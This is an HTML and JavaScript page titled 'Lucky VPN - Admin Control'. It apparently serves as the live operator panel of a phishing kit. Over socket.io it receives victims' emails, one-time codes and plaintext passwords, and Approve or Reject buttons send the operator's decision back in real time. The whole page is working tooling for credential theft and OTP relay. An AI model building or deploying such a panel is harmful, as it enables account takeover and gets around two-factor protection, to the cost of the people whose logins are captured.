<!DOCTYPE html>
<html>
<head>
    <title>Lucky VPN - Admin Control</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
        .card { background: white; padding: 15px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #ddd; }
        button { padding: 10px 20px; cursor: pointer; border: none; border-radius: 5px; color: white; margin-right: 5px; }
        .btn-ok { background: green; }
        .btn-no { background: red; }
    </style>
</head>
<body>
    <h2>Admin Control Panel (Live)</h2>
    <div id="requests"></div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    
    <script>
        const socket = io(); // Connect to server

        socket.on('admin_receive_data', (data) => {
            const div = document.createElement('div');
            div.className = 'card';
            div.innerHTML = `
                <p><strong>Type:</strong> ${data.type}</p>
                <p><strong>Email/OTP:</strong> ${data.email || data.otp || 'N/A'}</p>
                <p><strong>Password:</strong> ${data.pass || 'N/A'}</p>
                <button class="btn-ok" onclick="respond('${data.id}', 'OK')">Approve (Active)</button>
                <button class="btn-no" onclick="respond('${data.id}', 'NO')">Reject (Not Active)</button>
            `;
            document.getElementById('requests').prepend(div);
        });

        function respond(userId, status) {
            socket.emit('admin_decision', { userId, status });
            alert("Sent: " + status);
        }
    </script>
</body>
</html>
